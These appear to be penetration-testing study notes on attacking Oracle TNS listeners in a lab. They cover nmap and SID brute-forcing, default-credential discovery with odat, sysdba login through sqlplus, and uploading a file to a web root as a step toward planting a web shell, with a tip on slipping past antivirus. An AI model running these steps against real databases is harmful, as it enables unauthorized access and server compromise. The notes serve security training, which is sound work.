## TNS

---

Oracle TNS can be remotely managed in `Oracle 8i`/`9i` but not in Oracle 10g/11g.
 ## config
 uses a `listener.ora` and `tnsnames.ora`  
 `listener.ora` and are typically located in the `$ORACLE_HOME/network/admin` directory. The plain text file contains configuration information for Oracle database instances and other network services that use the TNS protocol.

- nmap

```shell-session
	$ sudo nmap -p1521 -sV 10.129.204.235 --open
```

- Nmap - SID Bruteforcing

```shell-session
$ sudo nmap -p1521 -sV 10.129.204.235 --open --script oracle-sid-brute

# NSE result:
| oracle-sid-brute:
|_  XE
```

- odat

```
$ ./odat.py all -s 10.129.204.235

#result:
[+] Valid credentials found: scott/tiger. Continue...
```

### understanding configuration files

#### Tnsnames.ora

```txt
ORCL =
  (DESCRIPTION =
    (ADDRESS_LIST =
      (ADDRESS = (PROTOCOL = TCP)(HOST = 10.129.11.102)(PORT = 1521))
    )
    (CONNECT_DATA =
      (SERVER = DEDICATED)
      (SERVICE_NAME = orcl)
    )
  )
```

#### Listener.ora

```txt
SID_LIST_LISTENER =
  (SID_LIST =
    (SID_DESC =
      (SID_NAME = PDB1)
      (ORACLE_HOME = C:\oracle\product\19.0.0\dbhome_1)
      (GLOBAL_DBNAME = PDB1)
      (SID_DIRECTORY_LIST =
        (SID_DIRECTORY =
          (DIRECTORY_TYPE = TNS_ADMIN)
          (DIRECTORY = C:\oracle\product\19.0.0\dbhome_1\network\admin)
        )
      )
    )
  )

LISTENER =
  (DESCRIPTION_LIST =
    (DESCRIPTION =
      (ADDRESS = (PROTOCOL = TCP)(HOST = orcl.blackwood.com)(PORT = 1521))
      (ADDRESS = (PROTOCOL = IPC)(KEY = EXTPROC1521))
    )
  )

ADR_BASE_LISTENER = C:\oracle
```

### Oracle-Tools-setup.sh

---

Code: bash

```bash
#!/bin/bash

sudo apt-get install libaio1 python3-dev alien -y
git clone https://github.com/quentinhardy/odat.git
cd odat/
git submodule init
git submodule update
wget https://download.oracle.com/otn_software/linux/instantclient/2112000/instantclient-basic-linux.x64-21.12.0.0.0dbru.zip
unzip instantclient-basic-linux.x64-21.12.0.0.0dbru.zip
wget https://download.oracle.com/otn_software/linux/instantclient/2112000/instantclient-sqlplus-linux.x64-21.12.0.0.0dbru.zip
unzip instantclient-sqlplus-linux.x64-21.12.0.0.0dbru.zip
export LD_LIBRARY_PATH=instantclient_21_12:$LD_LIBRARY_PATH
export PATH=$LD_LIBRARY_PATH:$PATH
pip3 install cx_Oracle
sudo apt-get install python3-scapy -y
sudo pip3 install colorlog termcolor passlib python-libnmap
sudo apt-get install build-essential libgmp-dev -y
pip3 install pycryptodome
```

retrieve database names, versions, running processes, user accounts, vulnerabilities, misconfigurations, etc. Let us use the `all` option and try all modules of the `odat.py` tool.
 ```shell-session
$ ./odat.py all -s 10.129.204.235

````
## ORACLE DB
------------------
if valid creds were discovered from `odat`
enumerate service further
- need valid creds to connect with sqlplus
	```
	sqplus <name>/<pw>@<ip>/<service>
	```
- check Ur permission
	```
	select * from user_role_privs
	```
- check if  user can login as admin,  u can login with admin `<sysdba>`
	```
	sqplus <name>/<pw>@<ip>/<service> as <sysdba>
	```
- check Ur Permissions again with the `<sysdba> login`
	```
	select * from user_role_privs
	```
Another option is to upload a web shell to the target. However, this requires the server to run a web server, and we need to know the exact location of the root directory for the webserver. Nevertheless, if we know what type of system we are dealing with, we can try the default paths, which are:

| **OS**  | **Path**             |
| ------- | -------------------- |
| Linux   | `/var/www/html`      |
| Windows | `C:\inetpub\wwwroot` |
|         |                      |

First, trying our exploitation approach with files that do not look dangerous for Antivirus or Intrusion detection/prevention systems is always important. Therefore, we create a text file with a string and use it to upload to the target system.

#### Oracle RDBMS - File Upload

  Oracle TNS

```shell-session
$ echo "Oracle File Upload Test" > testing.txt

$ ./odat.py utlfile -s 10.129.204.235 -d XE -U scott -P tiger --sysdba --putFile C:\\inetpub\\wwwroot testing.txt ./testing.txt


````

Finally, we can test if the file upload approach worked with `curl`. Therefore, we will use a `GET http://<IP>` request, or we can visit via browser.

```shell-session
$ curl -X GET http://10.129.204.235/testing.txt

Oracle File Upload Test
```
